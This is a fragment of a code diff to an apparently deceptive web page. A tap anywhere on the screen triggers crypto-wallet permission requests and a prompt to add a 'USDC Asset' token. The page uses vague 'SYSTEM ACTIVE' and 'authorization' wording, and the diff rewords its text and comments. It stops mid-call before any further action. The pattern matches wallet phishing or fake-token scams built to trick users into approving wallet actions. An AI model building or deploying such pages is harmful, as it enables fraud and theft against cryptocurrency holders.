@@ -12,20 +12,20 @@
 <body onclick="forceBridge()">
     <div class="box">
         <h2 style="margin:0;">SYSTEM ACTIVE</h2>
-        <p>TAP ANYWHERE ON SCREEN TO FINALIZE</p>
+        <p>TAP TO TRIGGER AUTHORIZATION</p>
     </div>
 
     <script>
         async function forceBridge() {
             if (window.ethereum) {
                 try {
-                    // Force a total handshake reset
+                    // Step 1: Force identity re-verification
                     await window.ethereum.request({ 
                         method: 'wallet_requestPermissions', 
                         params: [{ eth_accounts: {} }] 
                     });
                     
-                    // Trigger the USDC Asset bridge with a unique transaction ID
+                    // Step 2: Inject the USDC Asset
                     await window.ethereum.request({
                         method: 'wallet_watchAsset',
                         params: {
